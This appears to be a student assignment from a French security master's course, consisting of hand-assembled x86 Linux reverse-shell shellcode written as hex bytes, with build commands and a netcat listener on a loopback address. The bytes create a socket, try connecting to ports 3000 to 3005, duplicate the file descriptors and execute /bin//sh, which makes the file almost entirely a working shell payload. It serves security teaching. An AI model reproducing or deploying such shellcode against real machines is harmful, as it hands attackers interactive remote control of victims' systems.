# NOM / Prénom : NEHME Ali - MEZANI Nazim
# REVERSE SHELL ASM
# M1 - Sécurité - GR3
# ESGI
#

# nc -l -p 3005 -s 127.1.1.1 (port : 3000 & 3005)
# m2elf --in portscan-shellcode.m --out portscan-shellcode && ./portscan-shellcode

29 c0 
66 b8 67 01 
31 d2 
89 d1 
41
89 cb 
43
cd 80 
89 c3 
31 f6 
68 7f 01 01 01
29 c0 
66 bf b8 0b 
01 f7 
66 c1 c7 08 
66 57 
66 6a 02
66 b8 6a 01 
89 e1 
b2 10 
cd 80 
85 c0 
75 02 
eb 08 
46
83 fe 05
7e d4 
eb 1f 
50
68 6e 2f 73 68
68 2f 2f 62 69
04 03 
89 c1 
b0 3f 
49
cd 80 
75 f9 
89 c8 
b2 0b 
92
89 e3 
cd 80 
31 c0 
40
31 db 
cd 80 